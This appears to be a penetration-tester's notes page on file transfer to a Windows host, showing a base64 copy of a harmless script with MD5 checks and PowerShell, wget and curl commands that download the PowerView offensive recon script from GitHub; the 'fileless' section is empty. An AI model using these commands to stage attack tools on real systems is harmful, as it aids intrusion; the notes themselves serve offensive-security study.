### Copying Using Base64

Verify the MD5 hash of the target file:

```bash
garffff@garffff:~/test$ more hello.py 
print("hello world!")
gareth@gareth:~/test$ md5sum hello.py 
01c0a257edd3c2e95c25d80a4c18c5cc  hello.py
```

Base64 the target file :

```bash
garffff@garffff:~/test$ cat hello.py |base64 -w 0;echo
cHJpbnQoImhlbGxvIHdvcmxkISIp
```

In PowerShell, echo the base64 output to a location:

```bash
PS C:\users\public\downloads> [IO.File]::WriteAllBytes("C:\Users\Public\hello.py", [Convert]::FromBase64String("cHJpbnQoImhlbGxvIHdvcmxkISIp"))
```

Verify MD5 of target file:

```bash
PS C:\users\public\downloads> Get-FileHash C:\Users\Public\hello.py -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             01C0A257EDD3C2E95C25D80A4C18C5CC                                 
```

### Web Downloads

Malicious files can be detected by Defender:

```bash
PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
PS C:\users\public\downloads> wget 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_wget.ps1
PS C:\users\public\downloads> curl 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_curl.ps1
```

### Web Downloads - Fileless

```bash

```

